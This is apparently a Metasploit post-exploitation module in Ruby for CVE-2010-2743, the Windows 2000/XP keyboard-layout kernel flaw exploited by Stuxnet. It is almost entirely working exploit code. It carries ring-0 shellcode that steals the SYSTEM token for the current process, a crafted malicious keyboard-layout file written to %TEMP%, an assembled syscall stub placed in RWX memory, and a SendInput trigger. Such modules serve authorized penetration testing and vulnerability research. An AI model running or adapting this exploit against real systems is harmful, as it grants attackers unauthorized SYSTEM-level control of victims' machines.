1 ##
 
2 # $Id: $
 
3 ##
 
4  
5 ##
 
6 # This file is part of the Metasploit Framework and may be subject to
 
7 # redistribution and commercial restrictions. Please see the Metasploit
 
8 # Framework web site for more information on licensing and terms of use.
 
9 # http://metasploit.com/framework/
 
10 ##
 
11  
12 require 'msf/core'
 
13 require 'rex'
 
14 require 'metasm'
 
15  
16  
17 class Metasploit3 < Msf::Post
 
18  
19         def initialize(info={})
 
20                 super(update_info(info,
 
21                         'Name'          => 'Microsoft Windows NtUserLoadKeyboardLayoutEx Privilege Escalation',
 
22                         'Description'   => %q{
 
23                                         This module exploits the keyboard layout 0day exploited by Stuxnet. When
 
24                                 processing specially crafted keyboard layout files (DLLs), the Windows kernel fails
 
25                                 to validate that an array index is within the bounds of the array. By loading
 
26                                 a specially crafted keyboard layout, an attacker can execute code in Ring 0.
 
27                         },
 
28                         'License'       => MSF_LICENSE,
 
29                         'Author'        =>
 
30                                 [
 
31                                         'Ruben Santamarta',  # First public exploit
 
32                                         'jduck'              # Metasploit module
 
33                                 ],
 
34                         'Version'       => '$Revision: $',
 
35                         'Platform'      => [ 'windows' ],
 
36                         'SessionTypes'  => [ 'meterpreter' ],
 
37                         'References'    =>
 
38                                 [
 
39                                         [ 'CVE', '2010-2743' ],
 
40                                         [ 'MSB', 'MS10-073' ],
 
41                                         [ 'URL', 'http://www.exploit-db.com/exploits/15985/' ]
 
42                                 ],
 
43                         'DisclosureDate'=> "Oct 22 2010"
 
44                 ))
 
45  
46         end
 
47  
48         def run
 
49                 mem_base = nil
 
50                 dllpath = nil
 
51                 hDll = false
 
52  
53                 vuln = false
 
54                 winver = session.sys.config.sysinfo["OS"]
 
55                 affected = [ 'Windows 2000', 'Windows XP' ]
 
56                 affected.each { |v|
 
57                         if winver.include? v
 
58                                 vuln = true
 
59                                 break
 
60                         end
 
61                 }
 
62                 if not vuln
 
63                         print_error("#{winver} is not vulnerable.")
 
64                         return
 
65                 end
 
66  
67                 # syscalls from http://j00ru.vexillium.org/win32k_syscalls/
 
68                 if winver =~ /2000/
 
69                         system_pid = 8
 
70                         pid_off = 0x9c
 
71                         flink_off = 0xa0
 
72                         token_off = 0x12c
 
73                         addr = 0x41424344
 
74                         syscall_stub = <<-EOS
 
75 mov eax, 0x000011b6
 
76 lea edx, [esp+4]
 
77 int 0x2e
 
78 ret 0x1c
 
79 EOS
 
80                 else # XP
 
81                         system_pid = 4
 
82                         pid_off = 0x84
 
83                         flink_off = 0x88
 
84                         token_off = 0xc8
 
85                         addr = 0x60636261
 
86                         syscall_stub = <<-EOS
 
87 mov eax, 0x000011c6
 
88 mov edx, 0x7ffe0300
 
89 call [edx]
 
90 ret 0x1c
 
91 EOS
 
92                 end
 
93  
94                 ring0_code =
 
95                         #"\xcc" +
 
96                         # save registers -- necessary for successfuly recovery
 
97                         "\x60" +
 
98                         # get EPROCESS from ETHREAD
 
99                         "\x64\xa1\x24\x01\x00\x00" +
 
100                         "\x8b\x70\x44" +
 
101                         # init PID search
 
102                         "\x89\xf0" +
 
103                         "\xbb" + "FFFF" +
 
104                         "\xb9" + "PPPP" +
 
105                         # look for the system pid EPROCESS
 
106                         "\xba" + "SSSS" +
 
107                         "\x8b\x04\x18" +
 
108                         "\x29\xd8" +
 
109                         "\x39\x14\x08" +
 
110                         "\x75\xf6" +
 
111                         # save the system token addr in edi
 
112                         "\xbb" + "TTTT" +
 
113                         "\x8b\x3c\x18" +
 
114                         "\x83\xe7\xf8" +
 
115                         # re-init the various offsets
 
116                         "\x89\xf0"  +
 
117                         "\xbb" + "FFFF" +
 
118                         "\xb9" + "PPPP" +
 
119                         # find the target pid token
 
120                         "\xba" + "TPTP" +
 
121                         "\x8b\x04\x18" +
 
122                         "\x29\xd8" +
 
123                         "\x39\x14\x08" +
 
124                         "\x75\xf6" +
 
125                         # set the target pid's token to the system token
 
126                         "\xbb" + "TTTT" +
 
127                         "\x89\x3c\x18" +
 
128                         # restore start context
 
129                         "\x61" +
 
130                         # recover in ring0, return to caller
 
131                         "\xc2\x0c\00"
 
132  
133                 dll_data =
 
134                         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
135                         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
136                         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
137                         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00" +
 
138                         "\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
139                         "\x00\x00\x00\x00\xE0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
140                         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
141                         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
142                         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
143                         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
144                         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
145                         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
146                         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
147                         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
148                         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
149                         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
150                         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
151                         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
152                         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
153                         "\x00\x00\x00\x00\x00\x00\x00\x00\x2E\x64\x61\x74\x61\x00\x00\x00" +
 
154                         "\xE6\x00\x00\x00\x60\x01\x00\x00\xE6\x00\x00\x00\x60\x01\x00\x00" +
 
155                         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
156                         "\x94\x01\x00\x00\x9E\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
157                         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
158                         "\xA6\x01\x00\x00\xAA\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
159                         "\x00\x00\x00\x00\x9C\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
160                         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
161                         "\x00\x00\x01\x00\x00\x00\xC2\x01\x00\x00\x00\x00\x00\x00\x00\x00" +
 
162                         "\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
163                         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
164                         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
165                         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
166                         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
167                         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
168                         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
169                         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
170                         "\x00\x00\x00\x00\x00\x00"
 
171  
172                 pid = session.sys.process.getpid
 
173                 print_status("Attempting to elevate PID 0x%x" % pid)
 
174  
175                 # Prepare the shellcode (replace platform specific stuff, and pid)
 
176                 ring0_code.gsub!('FFFF', [flink_off].pack('V'))
 
177                 ring0_code.gsub!('PPPP', [pid_off].pack('V'))
 
178                 ring0_code.gsub!('SSSS', [system_pid].pack('V'))
 
179                 ring0_code.gsub!('TTTT', [token_off].pack('V'))
 
180                 ring0_code.gsub!('TPTP', [pid].pack('V'))
 
181  
182                 # Create the malicious Keyboard Layout file...
 
183                 tmpdir = session.fs.file.expand_path("%TEMP%")
 
184                 fname = "p0wns.boom"
 
185                 dllpath = "#{tmpdir}\\#{fname}"
 
186                 fd = session.fs.file.new(dllpath, 'wb')
 
187                 fd.write(dll_data)
 
188                 fd.close
 
189  
190                 # Can't use this atm, no handle access via stdapi :(
 
191                 #dll_fd = session.fs.file.new(dllpath, 'rb')
 
192                 # Instead, we'll use railgun to re-open the file
 
193                 ret = session.railgun.kernel32.CreateFileA(dllpath, GENERIC_READ, 1, nil, 3, 0, 0)
 
194                 print_status(ret.inspect)
 
195                 if ret['return'] < 1
 
196                         print_error("Unable to open #{dllpath}")
 
197                         return
 
198                 end
 
199                 hDll = ret['return']
 
200                 print_status("Wrote malicious keyboard layout to #{dllpath} ..")
 
201  
202                 # Allocate some RWX virtual memory for our use..
 
203                 mem_base = addr & 0xffff0000
 
204                 mem_size = (addr & 0xffff) + 0x1000
 
205                 mem_size += (0x1000 - (mem_size % 0x1000))
 
206                 mem = session.railgun.kernel32.VirtualAlloc(mem_base, mem_size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
 
207                 if (mem['return'] != mem_base)
 
208                         print_error("Unable to allocate RWX memory @ 0x%x" % mem_base)
 
209                         return
 
210                 end
 
211                 print_status("Allocated 0x%x bytes of memory @ 0x%x" % [mem_size, mem_base])
 
212  
213                 # Initialize the buffer to contain NO-OPs
 
214                 nops = "\x90" * mem_size
 
215                 ret = session.railgun.memwrite(mem_base, nops, nops.length)
 
216                 if not ret
 
217                         print_error("Unable to fill memory with NO-OPs")
 
218                         return
 
219                 end
 
220  
221                 # Copy the shellcode to the desired place
 
222                 ret = session.railgun.memwrite(addr, ring0_code, ring0_code.length)
 
223                 if not ret
 
224                         print_error("Unable to copy ring0 payload")
 
225                         return
 
226                 end
 
227  
228                 # InitializeUnicodeStr(&uStr,L"pwn3d.dll"); -- Is this necessary?
 
229                 pKLID = mem_base
 
230                 pStr = pKLID + (2+2+4)
 
231                 kbd_name = "pwn3d.dll"
 
232                 uni_name = Rex::Text.to_unicode(kbd_name + "\x00")
 
233                 ret = session.railgun.memwrite(pStr, uni_name, uni_name.length)
 
234                 if not ret
 
235                         print_error("Unable to copy unicode string data")
 
236                         return
 
237                 end
 
238                 unicode_str = [
 
239                         kbd_name.length * 2,
 
240                         uni_name.length,
 
241                         pStr
 
242                 ].pack('vvV')
 
243                 ret = session.railgun.memwrite(pKLID, unicode_str, unicode_str.length)
 
244                 if not ret
 
245                         print_error("Unable to copy UNICODE_STRING structure")
 
246                         return
 
247                 end
 
248                 print_status("Initialized RWX buffer ...")
 
249  
250                 # Get the current Keyboard Layout
 
251                 ret = session.railgun.user32.GetKeyboardLayout(0)
 
252                 if ret['return'] < 1
 
253                         print_error("Unable to GetKeyboardLayout")
 
254                         return
 
255                 end
 
256                 hKL = ret['return']
 
257                 print_status("Current Keyboard Layout: 0x%x" % hKL)
 
258  
259                 # _declspec(naked) HKL __stdcall NtUserLoadKeyboardLayoutEx(
 
260                 #  IN HANDLE Handle,
 
261                 #  IN DWORD offTable,
 
262                 #  IN PUNICODE_STRING puszKeyboardName,
 
263                 #  IN HKL hKL,
 
264                 #  IN PUNICODE_STRING puszKLID,
 
265                 #  IN DWORD dwKLID,
 
266                 #  IN UINT Flags 
 
267                 # )
 
268  
269                 # Again, railgun/meterpreter doesn't implement calling a non-dll function, so
 
270                 # I tried to hack up this call to KiFastSystemCall, but that didn't work either...
 
271 =begin
 
272                 session.railgun.add_function('ntdll', 'KiFastSystemCall', 'DWORD',
 
273                         [
 
274                                 [ 'DWORD', 'syscall', 'in' ],
 
275                                 [ 'DWORD', 'handle', 'in' ],
 
276                                 [ 'DWORD', 'offTable', 'in' ],
 
277                                 [ 'PBLOB', 'pKbdName', 'in' ],
 
278                                 [ 'DWORD', 'hKL', 'in' ],
 
279                                 [ 'PBLOB', 'pKLID', 'in' ],
 
280                                 [ 'DWORD', 'dwKLID', 'in' ],
 
281                                 [ 'DWORD', 'Flags', 'in' ]
 
282                         ])
 
283                 ret = session.railgun.ntdll.KiFastSystemCall(dll_fd, 0x1ae0160, nil, hKL, pKLID, 0x666, 0x101)
 
284                 print_status(ret.inspect)
 
285 =end
 
286  
287                 # Instead, we'll craft a machine code blob to setup the stack and perform
 
288                 # the system call..
 
289                 asm = <<-EOS
 
290 pop esi
 
291 push 0x101
 
292 push 0x666
 
293 push #{"0x%x" % pKLID}
 
294 push #{"0x%x" % hKL}
 
295 push 0
 
296 push 0x1ae0160
 
297 push #{"0x%x" % hDll}
 
298 push esi
 
299 #{syscall_stub}
 
300 EOS
 
301                 #print_status("\n" + asm)
 
302                 bytes = Metasm::Shellcode.assemble(Metasm::Ia32.new, asm).encode_string
 
303                 #print_status("\n" + Rex::Text.to_hex_dump(bytes))
 
304  
305                 # Copy this new system call wrapper function into our RWX memory
 
306                 func_ptr = mem_base + 0x1000
 
307                 ret = session.railgun.memwrite(func_ptr, bytes, bytes.length)
 
308                 if not ret
 
309                         print_error('Unable to copy system call stub')
 
310                         return
 
311                 end
 
312                 print_status("Patched in syscall wrapper @ 0x%x" % func_ptr)
 
313  
314                 # GO GO GO
 
315                 ret = session.railgun.kernel32.CreateThread(nil, 0, func_ptr, nil, "CREATE_SUSPENDED", nil)
 
316                 if ret['return'] < 1
 
317                         print_error("Unable to CreateThread")
 
318                         return
 
319                 end
 
320                 hthread = ret['return']
 
321  
322                 # Resume the thread to actually have the syscall happen
 
323                 ret = client.railgun.kernel32.ResumeThread(hthread)
 
324                 if ret['return'] < 1
 
325                         print_error("Unable to ResumeThread")
 
326                         return
 
327                 end
 
328                 print_status("Successfully executed syscall wrapper!")
 
329  
330                 # Now, send some input to cause ring0 payload execution...
 
331                 print_status("Attemping to cause the ring0 payload to execute...");
 
332                 vInput = [
 
333                         1,    # INPUT_KEYBOARD - input type
 
334                         # KEYBDINPUT struct
 
335                         0x0,  # wVk
 
336                         0x0,  # wScan
 
337                         0x0,  # dwFlags
 
338                         0x0,  # time
 
339                         0x0,  # dwExtraInfo
 
340                         0x0,  # pad 1
 
341                         0x0   # pad 2
 
342                 ].pack('VvvVVVVV')
 
343                 ret = session.railgun.user32.SendInput(1, vInput, vInput.length)
 
344                 print_status('SendInput: ' + ret.inspect)
 
345  
346         ensure
 
347                 # Clean up
 
348                 if mem_base
 
349                         ret = session.railgun.kernel32.VirtualFree(mem_base, 0, MEM_RELEASE)
 
350                         if not ret['return']
 
351                                 print_error("Unable to free memory @ 0x%x" % mem_base)
 
352                         end
 
353                 end
 
354  
355                 #dll_fd.close
 
356                 if hDll
 
357                         ret = session.railgun.kernel32.CloseHandle(hDll)
 
358                         if not ret['return']
 
359                                 print_error("Unable to CloseHandle")
 
360                         end
 
361                 end
 
362  
363                 session.fs.file.rm(dllpath) if dllpath
 
364  
365         end
 
366  
367  
368 end
 

